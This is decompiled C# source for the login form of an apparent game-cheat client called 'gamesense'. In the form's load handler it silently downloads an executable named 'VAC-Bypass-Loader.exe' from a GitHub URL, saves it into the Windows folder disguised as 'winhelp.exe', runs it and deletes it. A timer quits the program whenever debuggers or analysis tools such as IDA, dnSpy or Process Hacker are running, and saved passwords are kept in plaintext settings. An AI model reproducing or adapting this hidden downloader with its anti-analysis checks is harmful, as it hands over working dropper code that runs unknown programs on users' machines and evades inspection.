using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Auth.GG_Winform_Example;
using Crypto.xyz.Properties;

namespace gamesense
{
	// Token: 0x0200000F RID: 15
	public partial class Form1 : Form
	{
		// Token: 0x06000080 RID: 128
		[DllImport("user32.dll")]
		public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

		// Token: 0x06000081 RID: 129
		[DllImport("user32.dll")]
		public static extern bool ReleaseCapture();

		// Token: 0x06000082 RID: 130 RVA: 0x0018878C File Offset: 0x0018358C
		public Form1()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000083 RID: 131 RVA: 0x001887DC File Offset: 0x001835DC
		private void Form1_Load(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\" + this.bypass_name + ".exe";
			webClient.DownloadFile(this.bypass_link, text);
			Task.Delay(10000);
			Process.Start("winhelp.exe");
			if (this.bypass_array.Length != 0 && File.Exists(text))
			{
				File.Delete(text);
			}
			this.timer1.Start();
			ServicePointManager.SecurityProtocol = (SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12);
			if (Settings.Default.Username != string.Empty)
			{
				this.txtUsername.Text = Settings.Default.Username;
				this.txtPassword.Text = Settings.Default.Password;
			}
		}

		// Token: 0x06000084 RID: 132 RVA: 0x00184492 File Offset: 0x0017F292
		private void Form1_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				Form1.ReleaseCapture();
				Form1.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x06000085 RID: 133 RVA: 0x00187234 File Offset: 0x00182034
		private void timer1_Tick(object sender, EventArgs e)
		{
			Process[] processesByName = Process.GetProcessesByName("ida64");
			Process[] processesByName2 = Process.GetProcessesByName("ida32");
			Process[] processesByName3 = Process.GetProcessesByName("ollydbg");
			Process[] processesByName4 = Process.GetProcessesByName("ollydbg64");
			Process[] processesByName5 = Process.GetProcessesByName("loaddll");
			Process[] processesByName6 = Process.GetProcessesByName("httpdebugger");
			Process[] processesByName7 = Process.GetProcessesByName("windowrenamer");
			Process[] processesByName8 = Process.GetProcessesByName("processhacker");
			Process[] processesByName9 = Process.GetProcessesByName("Process Hacker");
			Process[] processesByName10 = Process.GetProcessesByName("ProcessHacker");
			Process[] processesByName11 = Process.GetProcessesByName("HxD");
			Process[] processesByName12 = Process.GetProcessesByName("parsecd");
			Process[] processesByName13 = Process.GetProcessesByName("ida");
			Process[] processesByName14 = Process.GetProcessesByName("dnSpy");
			if (processesByName.Length != 0 || processesByName2.Length != 0 || processesByName3.Length != 0 || processesByName4.Length != 0 || processesByName5.Length != 0 || processesByName6.Length != 0 || processesByName7.Length != 0 || processesByName8.Length != 0 || processesByName9.Length != 0 || processesByName10.Length != 0 || processesByName11.Length != 0 || processesByName13.Length != 0 || processesByName12.Length != 0 || processesByName14.Length != 0)
			{
				Application.Exit();
			}
		}

		// Token: 0x06000086 RID: 134 RVA: 0x001888B0 File Offset: 0x001836B0
		private void button1_Click_1(object sender, EventArgs e)
		{
			if (API.Login(this.txtUsername.Text, this.txtPassword.Text))
			{
				MessageBox.Show("Login successful!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				new Form2().Show();
				base.Hide();
			}
			else
			{
				base.Close();
			}
			if (this.checkRemember.Checked)
			{
				Settings.Default.Username = this.txtUsername.Text;
				Settings.Default.Password = this.txtPassword.Text;
				Settings.Default.Save();
			}
			if (!this.checkRemember.Checked)
			{
				Settings.Default.Username = "";
				Settings.Default.Password = "";
				Settings.Default.Save();
			}
		}

		// Token: 0x06000087 RID: 135 RVA: 0x001844C8 File Offset: 0x0017F2C8
		private void button2_Click_1(object sender, EventArgs e)
		{
			new Form3().Show();
			base.Hide();
		}

		// Token: 0x06000088 RID: 136 RVA: 0x0018445D File Offset: 0x0017F25D
		private void button4_Click(object sender, EventArgs e)
		{
			Application.Exit();
		}

		// Token: 0x06000089 RID: 137 RVA: 0x001844DD File Offset: 0x0017F2DD
		private void txtUsername_Enter(object sender, EventArgs e)
		{
			if (this.txtUsername.Text == "Username")
			{
				this.txtUsername.Text = "";
			}
		}

		// Token: 0x0600008A RID: 138 RVA: 0x0018450C File Offset: 0x0017F30C
		private void txtUsername_Leave(object sender, EventArgs e)
		{
			if (this.txtUsername.Text == "")
			{
				this.txtUsername.Text = "Username";
			}
		}

		// Token: 0x0600008B RID: 139 RVA: 0x0018453B File Offset: 0x0017F33B
		private void txtPassword_Enter(object sender, EventArgs e)
		{
			if (this.txtPassword.Text == "Password")
			{
				this.txtPassword.Text = "";
			}
		}

		// Token: 0x0600008C RID: 140 RVA: 0x0018456A File Offset: 0x0017F36A
		private void txtPassword_Leave(object sender, EventArgs e)
		{
			if (this.txtPassword.Text == "")
			{
				this.txtPassword.Text = "Password";
			}
		}

		// Token: 0x0600008D RID: 141 RVA: 0x00184599 File Offset: 0x0017F399
		private void checkBox1_CheckedChanged(object sender, EventArgs e)
		{
			if (this.checkBox1.Checked)
			{
				this.txtPassword.UseSystemPasswordChar = false;
				return;
			}
			this.txtPassword.UseSystemPasswordChar = true;
		}

		// Token: 0x0600008E RID: 142 RVA: 0x0018440B File Offset: 0x0017F20B
		private void label11_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600008F RID: 143 RVA: 0x0018440B File Offset: 0x0017F20B
		private void checkRemember_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x04000051 RID: 81
		private string bypass_link = "https://github.com/TapHvH/gsgsdhhh/raw/main/VAC-Bypass-Loader.exe";

		// Token: 0x04000052 RID: 82
		private string bypass_name = "winhelp";

		// Token: 0x04000053 RID: 83
		private Process[] bypass_array = Process.GetProcessesByName("winhelp");

		// Token: 0x04000054 RID: 84
		public const int WM_NCLBUTTONDOWN = 161;

		// Token: 0x04000055 RID: 85
		public const int HT_CAPTION = 2;
	}
}
